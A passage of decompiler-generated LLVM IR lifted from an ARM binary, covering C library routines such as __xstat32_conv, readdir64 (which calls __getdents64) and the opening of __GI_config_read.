  store i32 %v3_15970, i32* %v3_15974, align 4
  %v0_15978 = load i32, i32* %r6.global-to-local, align 4
  %v1_15978 = add i32 %v0_15978, 96
  store i32 %v1_15978, i32* %r3.global-to-local, align 4
  %v1_1597c = inttoptr i32 %v1_15978 to i32*
  %v2_1597c = load i32, i32* %v1_1597c, align 4
  store i32 %v2_1597c, i32* %r3.global-to-local, align 4
  %v3_1597c = add i32 %v0_15978, 100
  %v4_1597c = inttoptr i32 %v3_1597c to i32*
  %v5_1597c = load i32, i32* %v4_1597c, align 4
  store i32 %v5_1597c, i32* %r4.global-to-local, align 4
  %v1_15980 = add i32 %v0_15978, 56
  %v2_15980 = inttoptr i32 %v1_15980 to i32*
  %v3_15980 = load i32, i32* %v2_15980, align 4
  store i32 %v3_15980, i32* %r2.global-to-local, align 4
  %v1_15984 = load i32, i32* %r5.global-to-local, align 4
  %v2_15984 = add i32 %v1_15984, 96
  %v3_15984 = inttoptr i32 %v2_15984 to i32*
  store i32 %v2_1597c, i32* %v3_15984, align 4
  %v0_15988 = load i32, i32* %r4.global-to-local, align 4
  %v1_15988 = load i32, i32* %r5.global-to-local, align 4
  %v2_15988 = add i32 %v1_15988, 100
  %v3_15988 = inttoptr i32 %v2_15988 to i32*
  store i32 %v0_15988, i32* %v3_15988, align 4
  %v0_1598c = load i32, i32* %r6.global-to-local, align 4
  %v1_1598c = add i32 %v0_1598c, 24
  store i32 %v1_1598c, i32* %ip.global-to-local, align 4
  %v1_15990 = inttoptr i32 %v1_1598c to i32*
  %v2_15990 = load i32, i32* %v1_15990, align 4
  store i32 %v2_15990, i32* %ip.global-to-local, align 4
  %v3_15990 = add i32 %v0_1598c, 28
  %v4_15990 = inttoptr i32 %v3_15990 to i32*
  %v5_15990 = load i32, i32* %v4_15990, align 4
  store i32 %v5_15990, i32* %lr.global-to-local, align 4
  %v0_15994 = load i32, i32* %r2.global-to-local, align 4
  %v1_15994 = load i32, i32* %r5.global-to-local, align 4
  %v2_15994 = add i32 %v1_15994, 56
  %v3_15994 = inttoptr i32 %v2_15994 to i32*
  store i32 %v0_15994, i32* %v3_15994, align 4
  %v0_15998 = load i32, i32* %r6.global-to-local, align 4
  %v1_15998 = add i32 %v0_15998, 72
  store i32 %v1_15998, i32* %r3.global-to-local, align 4
  %v1_1599c = add i32 %v0_15998, 32
  store i32 %v1_1599c, i32* %r7.global-to-local, align 4
  %v1_159a0 = inttoptr i32 %v1_1599c to i32*
  %v2_159a0 = load i32, i32* %v1_159a0, align 4
  store i32 %v2_159a0, i32* %r7.global-to-local, align 4
  %v3_159a0 = add i32 %v0_15998, 36
  %v4_159a0 = inttoptr i32 %v3_159a0 to i32*
  %v5_159a0 = load i32, i32* %v4_159a0, align 4
  store i32 %v5_159a0, i32* %r8.global-to-local, align 4
  %v1_159a4 = inttoptr i32 %v1_15998 to i32*
  %v2_159a4 = load i32, i32* %v1_159a4, align 4
  %v3_159a4 = add i32 %v0_15998, 76
  %v4_159a4 = inttoptr i32 %v3_159a4 to i32*
  %v5_159a4 = load i32, i32* %v4_159a4, align 4
  store i32 %v5_159a4, i32* %r1.global-to-local, align 4
  %v0_159a8 = load i32, i32* %r5.global-to-local, align 4
  %v1_159a8 = add i32 %v0_159a8, 72
  %v1_159ac = inttoptr i32 %v1_159a8 to i32*
  store i32 %v2_159a4, i32* %v1_159ac, align 4
  %v3_159ac = add i32 %v0_159a8, 76
  %v4_159ac = inttoptr i32 %v3_159ac to i32*
  %v5_159ac = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_159ac, i32* %v4_159ac, align 4
  %v0_159b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_159b0 = load i32, i32* %r5.global-to-local, align 4
  %v2_159b0 = add i32 %v1_159b0, 32
  %v3_159b0 = inttoptr i32 %v2_159b0 to i32*
  store i32 %v0_159b0, i32* %v3_159b0, align 4
  %v0_159b4 = load i32, i32* %r8.global-to-local, align 4
  %v1_159b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_159b4 = add i32 %v1_159b4, 36
  %v3_159b4 = inttoptr i32 %v2_159b4 to i32*
  store i32 %v0_159b4, i32* %v3_159b4, align 4
  %v0_159b8 = load i32, i32* %r6.global-to-local, align 4
  %v1_159b8 = add i32 %v0_159b8, 80
  store i32 %v1_159b8, i32* %r3.global-to-local, align 4
  %v1_159bc = add i32 %v0_159b8, 48
  store i32 %v1_159bc, i32* %r7.global-to-local, align 4
  %v1_159c0 = inttoptr i32 %v1_159bc to i32*
  %v2_159c0 = load i32, i32* %v1_159c0, align 4
  store i32 %v2_159c0, i32* %r7.global-to-local, align 4
  %v3_159c0 = add i32 %v0_159b8, 52
  %v4_159c0 = inttoptr i32 %v3_159c0 to i32*
  %v5_159c0 = load i32, i32* %v4_159c0, align 4
  store i32 %v5_159c0, i32* %r8.global-to-local, align 4
  %v1_159c4 = inttoptr i32 %v1_159b8 to i32*
  %v2_159c4 = load i32, i32* %v1_159c4, align 4
  %v3_159c4 = add i32 %v0_159b8, 84
  %v4_159c4 = inttoptr i32 %v3_159c4 to i32*
  %v5_159c4 = load i32, i32* %v4_159c4, align 4
  store i32 %v5_159c4, i32* %r1.global-to-local, align 4
  %v1_159c8 = add i32 %v0_159b8, 16
  %v2_159c8 = inttoptr i32 %v1_159c8 to i32*
  %v3_159c8 = load i32, i32* %v2_159c8, align 4
  store i32 %v3_159c8, i32* %r2.global-to-local, align 4
  %v0_159cc = load i32, i32* %r5.global-to-local, align 4
  %v1_159cc = add i32 %v0_159cc, 80
  %v1_159d0 = inttoptr i32 %v1_159cc to i32*
  store i32 %v2_159c4, i32* %v1_159d0, align 4
  %v3_159d0 = add i32 %v0_159cc, 84
  %v4_159d0 = inttoptr i32 %v3_159d0 to i32*
  %v5_159d0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_159d0, i32* %v4_159d0, align 4
  %v0_159d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_159d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_159d4 = add i32 %v1_159d4, 48
  %v3_159d4 = inttoptr i32 %v2_159d4 to i32*
  store i32 %v0_159d4, i32* %v3_159d4, align 4
  %v0_159d8 = load i32, i32* %r8.global-to-local, align 4
  %v1_159d8 = load i32, i32* %r5.global-to-local, align 4
  %v2_159d8 = add i32 %v1_159d8, 52
  %v3_159d8 = inttoptr i32 %v2_159d8 to i32*
  store i32 %v0_159d8, i32* %v3_159d8, align 4
  %v0_159dc = load i32, i32* %r2.global-to-local, align 4
  %v1_159dc = load i32, i32* %r5.global-to-local, align 4
  %v2_159dc = add i32 %v1_159dc, 16
  %v3_159dc = inttoptr i32 %v2_159dc to i32*
  store i32 %v0_159dc, i32* %v3_159dc, align 4
  %v0_159e0 = load i32, i32* %r6.global-to-local, align 4
  %v1_159e0 = add i32 %v0_159e0, 88
  store i32 %v1_159e0, i32* %r3.global-to-local, align 4
  %v1_159e4 = add i32 %v0_159e0, 20
  %v2_159e4 = inttoptr i32 %v1_159e4 to i32*
  %v3_159e4 = load i32, i32* %v2_159e4, align 4
  store i32 %v3_159e4, i32* %r2.global-to-local, align 4
  %v1_159e8 = inttoptr i32 %v1_159e0 to i32*
  %v2_159e8 = load i32, i32* %v1_159e8, align 4
  %v3_159e8 = add i32 %v0_159e0, 92
  %v4_159e8 = inttoptr i32 %v3_159e8 to i32*
  %v5_159e8 = load i32, i32* %v4_159e8, align 4
  store i32 %v5_159e8, i32* %r1.global-to-local, align 4
  %v1_159ec = add i32 %v0_159e0, 64
  store i32 %v1_159ec, i32* %r6.global-to-local, align 4
  %v1_159f0 = inttoptr i32 %v1_159ec to i32*
  %v2_159f0 = load i32, i32* %v1_159f0, align 4
  store i32 %v2_159f0, i32* %r6.global-to-local, align 4
  %v3_159f0 = add i32 %v0_159e0, 68
  %v4_159f0 = inttoptr i32 %v3_159f0 to i32*
  %v5_159f0 = load i32, i32* %v4_159f0, align 4
  store i32 %v5_159f0, i32* %r7.global-to-local, align 4
  %v0_159f4 = load i32, i32* %r5.global-to-local, align 4
  %v1_159f4 = add i32 %v0_159f4, 88
  store i32 %v1_159f4, i32* %r3.global-to-local, align 4
  %v2_159f8 = add i32 %v0_159f4, 20
  %v3_159f8 = inttoptr i32 %v2_159f8 to i32*
  store i32 %v3_159e4, i32* %v3_159f8, align 4
  %v0_159fc = load i32, i32* %ip.global-to-local, align 4
  %v1_159fc = load i32, i32* %r5.global-to-local, align 4
  %v2_159fc = add i32 %v1_159fc, 24
  %v3_159fc = inttoptr i32 %v2_159fc to i32*
  store i32 %v0_159fc, i32* %v3_159fc, align 4
  %v0_15a00 = load i32, i32* %lr.global-to-local, align 4
  %v1_15a00 = load i32, i32* %r5.global-to-local, align 4
  %v2_15a00 = add i32 %v1_15a00, 28
  %v3_15a00 = inttoptr i32 %v2_15a00 to i32*
  store i32 %v0_15a00, i32* %v3_15a00, align 4
  %v0_15a04 = load i32, i32* %r6.global-to-local, align 4
  %v1_15a04 = load i32, i32* %r5.global-to-local, align 4
  %v2_15a04 = add i32 %v1_15a04, 64
  %v3_15a04 = inttoptr i32 %v2_15a04 to i32*
  store i32 %v0_15a04, i32* %v3_15a04, align 4
  %v0_15a08 = load i32, i32* %r7.global-to-local, align 4
  %v1_15a08 = load i32, i32* %r5.global-to-local, align 4
  %v2_15a08 = add i32 %v1_15a08, 68
  %v3_15a08 = inttoptr i32 %v2_15a08 to i32*
  store i32 %v0_15a08, i32* %v3_15a08, align 4
  %v0_15a0c = load i32, i32* %r3.global-to-local, align 4
  %v1_15a0c = inttoptr i32 %v0_15a0c to i32*
  store i32 %v2_159e8, i32* %v1_15a0c, align 4
  %v3_15a0c = add i32 %v0_15a0c, 4
  %v4_15a0c = inttoptr i32 %v3_15a0c to i32*
  %v5_15a0c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15a0c, i32* %v4_15a0c, align 4
  %v2_15a10 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15a10, i32* %r4.global-to-local, align 4
  ret i32 %v2_159e8

; uselistorder directives
  uselistorder i32 %v0_159e0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_159b8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_15a18 = load i32, i32* @r4, align 4
  store i32 %v3_15a18, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_15a30 = inttoptr i32 %arg2 to i8*
  %v4_15a30 = call i32 @__GI_memset(i8* %v3_15a30, i32 0, i32 88)
  %v2_15a34 = load i32, i32* %arg1, align 4
  %v3_15a34 = add i32 %tmp, 4
  %v4_15a34 = inttoptr i32 %v3_15a34 to i32*
  %v5_15a34 = load i32, i32* %v4_15a34, align 4
  store i32 %v5_15a34, i32* %r4.global-to-local, align 4
  %v0_15a38 = load i32, i32* %r6.global-to-local, align 4
  %v1_15a38 = inttoptr i32 %v0_15a38 to i32*
  store i32 %v2_15a34, i32* %v1_15a38, align 4
  %v3_15a38 = add i32 %v0_15a38, 4
  %v4_15a38 = inttoptr i32 %v3_15a38 to i32*
  %v5_15a38 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15a38, i32* %v4_15a38, align 4
  %v0_15a3c = load i32, i32* %r5.global-to-local, align 4
  %v1_15a3c = add i32 %v0_15a3c, 32
  %v1_15a40 = inttoptr i32 %v1_15a3c to i32*
  %v2_15a40 = load i32, i32* %v1_15a40, align 4
  %v3_15a40 = add i32 %v0_15a3c, 36
  %v4_15a40 = inttoptr i32 %v3_15a40 to i32*
  %v5_15a40 = load i32, i32* %v4_15a40, align 4
  store i32 %v5_15a40, i32* %r4.global-to-local, align 4
  %v1_15a44 = add i32 %v0_15a3c, 96
  %v2_15a44 = inttoptr i32 %v1_15a44 to i32*
  %v3_15a44 = load i32, i32* %v2_15a44, align 4
  store i32 %v3_15a44, i32* %r2.global-to-local, align 4
  %v1_15a48 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a48 = add i32 %v1_15a48, 32
  %v3_15a48 = inttoptr i32 %v2_15a48 to i32*
  store i32 %v2_15a40, i32* %v3_15a48, align 4
  %v0_15a4c = load i32, i32* %r4.global-to-local, align 4
  %v1_15a4c = load i32, i32* %r6.global-to-local, align 4
  %v2_15a4c = add i32 %v1_15a4c, 36
  %v3_15a4c = inttoptr i32 %v2_15a4c to i32*
  store i32 %v0_15a4c, i32* %v3_15a4c, align 4
  %v0_15a50 = load i32, i32* %r2.global-to-local, align 4
  %v1_15a50 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a50 = add i32 %v1_15a50, 12
  %v3_15a50 = inttoptr i32 %v2_15a50 to i32*
  store i32 %v0_15a50, i32* %v3_15a50, align 4
  %v0_15a54 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a54 = add i32 %v0_15a54, 48
  %v2_15a54 = inttoptr i32 %v1_15a54 to i32*
  %v3_15a54 = load i32, i32* %v2_15a54, align 4
  %v1_15a58 = add i32 %v0_15a54, 24
  store i32 %v1_15a58, i32* %ip.global-to-local, align 4
  %v1_15a5c = inttoptr i32 %v1_15a58 to i32*
  %v2_15a5c = load i32, i32* %v1_15a5c, align 4
  store i32 %v2_15a5c, i32* %ip.global-to-local, align 4
  %v3_15a5c = add i32 %v0_15a54, 28
  %v4_15a5c = inttoptr i32 %v3_15a5c to i32*
  %v5_15a5c = load i32, i32* %v4_15a5c, align 4
  store i32 %v5_15a5c, i32* %lr.global-to-local, align 4
  %v1_15a60 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a60 = add i32 %v1_15a60, 44
  %v3_15a60 = inttoptr i32 %v2_15a60 to i32*
  store i32 %v3_15a54, i32* %v3_15a60, align 4
  %v0_15a64 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a64 = add i32 %v0_15a64, 64
  %v2_15a64 = inttoptr i32 %v1_15a64 to i32*
  %v3_15a64 = load i32, i32* %v2_15a64, align 4
  %v1_15a68 = add i32 %v0_15a64, 56
  %v2_15a68 = inttoptr i32 %v1_15a68 to i32*
  %v3_15a68 = load i32, i32* %v2_15a68, align 4
  store i32 %v3_15a68, i32* %r2.global-to-local, align 4
  %v1_15a6c = load i32, i32* %r6.global-to-local, align 4
  %v2_15a6c = add i32 %v1_15a6c, 52
  %v3_15a6c = inttoptr i32 %v2_15a6c to i32*
  store i32 %v3_15a64, i32* %v3_15a6c, align 4
  %v0_15a70 = load i32, i32* %r2.global-to-local, align 4
  %v1_15a70 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a70 = add i32 %v1_15a70, 48
  %v3_15a70 = inttoptr i32 %v2_15a70 to i32*
  store i32 %v0_15a70, i32* %v3_15a70, align 4
  %v0_15a74 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a74 = add i32 %v0_15a74, 72
  %v1_15a78 = inttoptr i32 %v1_15a74 to i32*
  %v2_15a78 = load i32, i32* %v1_15a78, align 4
  %v3_15a78 = add i32 %v0_15a74, 76
  %v4_15a78 = inttoptr i32 %v3_15a78 to i32*
  %v5_15a78 = load i32, i32* %v4_15a78, align 4
  store i32 %v5_15a78, i32* %r1.global-to-local, align 4
  %v0_15a7c = load i32, i32* %r6.global-to-local, align 4
  %v1_15a7c = add i32 %v0_15a7c, 56
  %v1_15a80 = inttoptr i32 %v1_15a7c to i32*
  store i32 %v2_15a78, i32* %v1_15a80, align 4
  %v3_15a80 = add i32 %v0_15a7c, 60
  %v4_15a80 = inttoptr i32 %v3_15a80 to i32*
  %v5_15a80 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15a80, i32* %v4_15a80, align 4
  %v0_15a84 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a84 = add i32 %v0_15a84, 80
  %v1_15a88 = inttoptr i32 %v1_15a84 to i32*
  %v2_15a88 = load i32, i32* %v1_15a88, align 4
  %v3_15a88 = add i32 %v0_15a84, 84
  %v4_15a88 = inttoptr i32 %v3_15a88 to i32*
  %v5_15a88 = load i32, i32* %v4_15a88, align 4
  store i32 %v5_15a88, i32* %r1.global-to-local, align 4
  %v0_15a8c = load i32, i32* %r6.global-to-local, align 4
  %v1_15a8c = add i32 %v0_15a8c, 64
  %v1_15a90 = inttoptr i32 %v1_15a8c to i32*
  store i32 %v2_15a88, i32* %v1_15a90, align 4
  %v3_15a90 = add i32 %v0_15a8c, 68
  %v4_15a90 = inttoptr i32 %v3_15a90 to i32*
  %v5_15a90 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15a90, i32* %v4_15a90, align 4
  %v0_15a94 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a94 = add i32 %v0_15a94, 16
  %v2_15a94 = inttoptr i32 %v1_15a94 to i32*
  %v3_15a94 = load i32, i32* %v2_15a94, align 4
  %v1_15a98 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a98 = add i32 %v1_15a98, 16
  %v3_15a98 = inttoptr i32 %v2_15a98 to i32*
  store i32 %v3_15a94, i32* %v3_15a98, align 4
  %v0_15a9c = load i32, i32* %r5.global-to-local, align 4
  %v1_15a9c = add i32 %v0_15a9c, 88
  %v1_15aa0 = add i32 %v0_15a9c, 20
  %v2_15aa0 = inttoptr i32 %v1_15aa0 to i32*
  %v3_15aa0 = load i32, i32* %v2_15aa0, align 4
  store i32 %v3_15aa0, i32* %r2.global-to-local, align 4
  %v1_15aa4 = inttoptr i32 %v1_15a9c to i32*
  %v2_15aa4 = load i32, i32* %v1_15aa4, align 4
  %v3_15aa4 = add i32 %v0_15a9c, 92
  %v4_15aa4 = inttoptr i32 %v3_15aa4 to i32*
  %v5_15aa4 = load i32, i32* %v4_15aa4, align 4
  store i32 %v5_15aa4, i32* %r1.global-to-local, align 4
  %v0_15aa8 = load i32, i32* %r6.global-to-local, align 4
  %v1_15aa8 = add i32 %v0_15aa8, 72
  %v1_15aac = inttoptr i32 %v1_15aa8 to i32*
  store i32 %v2_15aa4, i32* %v1_15aac, align 4
  %v3_15aac = add i32 %v0_15aa8, 76
  %v4_15aac = inttoptr i32 %v3_15aac to i32*
  %v5_15aac = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15aac, i32* %v4_15aac, align 4
  %v0_15ab0 = load i32, i32* %r2.global-to-local, align 4
  %v1_15ab0 = load i32, i32* %r6.global-to-local, align 4
  %v2_15ab0 = add i32 %v1_15ab0, 20
  %v3_15ab0 = inttoptr i32 %v2_15ab0 to i32*
  store i32 %v0_15ab0, i32* %v3_15ab0, align 4
  %v0_15ab4 = load i32, i32* %ip.global-to-local, align 4
  %v1_15ab4 = load i32, i32* %r6.global-to-local, align 4
  %v2_15ab4 = add i32 %v1_15ab4, 24
  %v3_15ab4 = inttoptr i32 %v2_15ab4 to i32*
  store i32 %v0_15ab4, i32* %v3_15ab4, align 4
  %v0_15ab8 = load i32, i32* %lr.global-to-local, align 4
  %v1_15ab8 = load i32, i32* %r6.global-to-local, align 4
  %v2_15ab8 = add i32 %v1_15ab8, 28
  %v3_15ab8 = inttoptr i32 %v2_15ab8 to i32*
  store i32 %v0_15ab8, i32* %v3_15ab8, align 4
  %v2_15abc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15abc, i32* %r4.global-to-local, align 4
  ret i32 %v2_15aa4

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 96, { 5, 3, 4, 1, 2, 0, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* @r6, align 4
  %v1_15ad8 = add i32 %tmp, 24
  store i32 %v1_15ad8, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_15af0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 112) to i32*), align 4
  store i32 %v4_15af0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15af0)
  %v0_15b04 = load i32, i32* @r6, align 4
  %v2_15b04 = add i32 %v0_15b04, 16
  %v3_15b04 = inttoptr i32 %v2_15b04 to i32*
  %v4_15b04 = load i32, i32* %v3_15b04, align 4
  store i32 %v4_15b04, i32* %ip.global-to-local, align 4
  store i32 88848, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15b04)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_15b14

dec_label_pc_15b14:                               ; preds = %dec_label_pc_15b44, %entry
  %v0_15b14 = load i32, i32* @r5, align 4
  %v1_15b14 = add i32 %v0_15b14, 4
  %v2_15b14 = inttoptr i32 %v1_15b14 to i32*
  %v3_15b14 = load i32, i32* %v2_15b14, align 4
  %v4_15b14 = add i32 %v0_15b14, 8
  %v5_15b14 = inttoptr i32 %v4_15b14 to i32*
  %v6_15b14 = load i32, i32* %v5_15b14, align 4
  %tmp10 = icmp ugt i32 %v6_15b14, %v3_15b14
  br i1 %tmp10, label %dec_label_pc_15b44, label %dec_label_pc_15b20

dec_label_pc_15b20:                               ; preds = %dec_label_pc_15b14
  %v1_15b20 = inttoptr i32 %v0_15b14 to i32*
  %v2_15b20 = load i32, i32* %v1_15b20, align 4
  %v1_15b24 = add i32 %v0_15b14, 12
  %v2_15b24 = inttoptr i32 %v1_15b24 to i32*
  %v3_15b24 = load i32, i32* %v2_15b24, align 4
  %v1_15b28 = add i32 %v0_15b14, 20
  %v2_15b28 = inttoptr i32 %v1_15b28 to i32*
  %v3_15b28 = load i32, i32* %v2_15b28, align 4
  %v4_15b2c = inttoptr i32 %v3_15b24 to i32*
  %v5_15b2c = call i32 @__getdents64(i32 %v2_15b20, i32* %v4_15b2c, i32 %v3_15b28, i32 %v6_15b14)
  %tmp9 = icmp slt i32 %v5_15b2c, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_15b3c

.thread:                                          ; preds = %dec_label_pc_15b20
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_15b74

dec_label_pc_15b3c:                               ; preds = %dec_label_pc_15b20
  %v1_15b3c = load i32, i32* @r5, align 4
  %v2_15b3c = add i32 %v1_15b3c, 8
  %v3_15b3c = inttoptr i32 %v2_15b3c to i32*
  store i32 %v5_15b2c, i32* %v3_15b3c, align 4
  %v0_15b40 = load i32, i32* @r7, align 4
  %v1_15b40 = load i32, i32* @r5, align 4
  %v2_15b40 = add i32 %v1_15b40, 4
  %v3_15b40 = inttoptr i32 %v2_15b40 to i32*
  store i32 %v0_15b40, i32* %v3_15b40, align 4
  %v0_15b44.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15b44

dec_label_pc_15b44:                               ; preds = %dec_label_pc_15b14, %dec_label_pc_15b3c
  %v1_15b68 = phi i32 [ %v0_15b14, %dec_label_pc_15b14 ], [ %v0_15b44.pre, %dec_label_pc_15b3c ]
  %v1_15b44 = add i32 %v1_15b68, 4
  %v2_15b44 = inttoptr i32 %v1_15b44 to i32*
  %v3_15b44 = load i32, i32* %v2_15b44, align 4
  %v1_15b48 = add i32 %v1_15b68, 12
  %v2_15b48 = inttoptr i32 %v1_15b48 to i32*
  %v3_15b48 = load i32, i32* %v2_15b48, align 4
  %v2_15b4c = add i32 %v3_15b48, %v3_15b44
  store i32 %v2_15b4c, i32* @r4, align 4
  %v3_15b50 = inttoptr i32 %v2_15b4c to i32*
  %v4_15b50 = load i32, i32* %v3_15b50, align 4
  %v1_15b54 = add i32 %v2_15b4c, 4
  %v2_15b54 = inttoptr i32 %v1_15b54 to i32*
  %v3_15b54 = load i32, i32* %v2_15b54, align 4
  %v1_15b58 = add i32 %v2_15b4c, 16
  %v2_15b58 = inttoptr i32 %v1_15b58 to i16*
  %v3_15b58 = load i16, i16* %v2_15b58, align 2
  %v4_15b58 = zext i16 %v3_15b58 to i32
  %v1_15b5c = add i32 %v2_15b4c, 8
  %v2_15b5c = inttoptr i32 %v1_15b5c to i32*
  %v3_15b5c = load i32, i32* %v2_15b5c, align 4
  store i32 %v3_15b5c, i32* %ip.global-to-local, align 4
  %v2_15b60 = add i32 %v4_15b58, %v3_15b44
  %v2_15b64 = or i32 %v3_15b54, %v4_15b50
  %v4_15b64 = icmp eq i32 %v2_15b64, 0
  store i32 %v2_15b60, i32* %v2_15b44, align 4
  %v0_15b6c = load i32, i32* %ip.global-to-local, align 4
  %v1_15b6c = load i32, i32* @r5, align 4
  %v2_15b6c = add i32 %v1_15b6c, 16
  %v3_15b6c = inttoptr i32 %v2_15b6c to i32*
  store i32 %v0_15b6c, i32* %v3_15b6c, align 4
  br i1 %v4_15b64, label %dec_label_pc_15b14, label %dec_label_pc_15b74

dec_label_pc_15b74:                               ; preds = %dec_label_pc_15b44, %.thread
  %v0_15b80 = load i32, i32* @r6, align 4
  %v2_15b80 = add i32 %v0_15b80, 44
  %v3_15b80 = inttoptr i32 %v2_15b80 to i32*
  %v4_15b80 = load i32, i32* %v3_15b80, align 4
  store i32 %v4_15b80, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15b80)
  %v0_15b8c = load i32, i32* @r4, align 4
  ret i32 %v0_15b8c

; uselistorder directives
  uselistorder i32 %v2_15b4c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_15b68, { 1, 0 }
  uselistorder i32 %v6_15b14, { 1, 0 }
  uselistorder i32 %v0_15b14, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 112, { 1, 2, 3, 0, 4 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 112) to i32*), { 0, 1, 2, 3, 4, 7, 5, 6 }
  uselistorder label %dec_label_pc_15b44, { 1, 0 }
}

define i32 @function_15ba0(i32 %arg1) local_unnamed_addr {
dec_label_pc_15ba0:
  %v0_15ba0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15ba0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_15ba0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15ba0, %bb
  %v4_15bac = phi i32 [ %arg1, %dec_label_pc_15ba0 ], [ 0, %bb ]
  ret i32 %v4_15bac

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_15bb0 = load i32, i32* @r4, align 4
  %v6_15bb0 = load i32, i32* @r5, align 4
  %v9_15bb0 = load i32, i32* @r6, align 4
  %v12_15bb0 = load i32, i32* @r7, align 4
  %v15_15bb0 = load i32, i32* @r8, align 4
  %v18_15bb0 = load i32, i32* @sb, align 4
  %v21_15bb0 = load i32, i32* @sl, align 4
  %v24_15bb0 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_15bb4 = icmp eq i32* %arg1, null
  store i1 %v2_15bb4, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_15bb4, label %dec_label_pc_15ec4, label %dec_label_pc_15bcc

dec_label_pc_15bcc:                               ; preds = %entry
  %v1_15bcc = urem i32 %arg3, 256
  store i32 %v1_15bcc, i32* @sb, align 4
  %v1_15bd0 = udiv i32 %arg3, 256
  %v3_15bd4 = urem i32 %v1_15bd0, 256
  %v3_15bd8 = mul nuw nsw i32 %v1_15bcc, 4
  %v1_15be0 = or i32 %v3_15bd8, 1
  %v1_15bec = and i32 %arg3, 131072
  %v1_15bf0 = add nsw i32 %v1_15bcc, -1
  %v1_15bfc = and i32 %arg3, 262144
  store i32 %v1_15bfc, i32* %r2.global-to-local, align 4
  %v1_15c00 = and i32 %arg3, 65536
  store i32 %v1_15c00, i32* %r3.global-to-local, align 4
  store i32 %v1_15c00, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_15c10 = add i32 %arg4, 1
  store i32 %v1_15c10, i32* @sl, align 4
  %v2_15d88 = icmp eq i32 %v1_15bec, 0
  %v1_15de0 = inttoptr i32 %arg2 to i32*
  %v2_15df8 = icmp eq i32 %v1_15bfc, 0
